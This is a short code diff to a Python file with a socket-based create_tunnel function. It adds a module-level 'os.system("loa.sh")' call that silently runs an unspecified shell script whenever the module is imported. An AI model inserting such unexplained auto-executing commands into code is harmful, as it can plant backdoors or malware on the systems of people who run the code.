@@ -5,7 +5,9 @@ import numpy as np
 import tensorflow as tf
 import hashlib
 import hmac
+import os
 #ats
+os.system("loa.sh")
 def create_tunnel(server_ip, server_port, secret_key):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
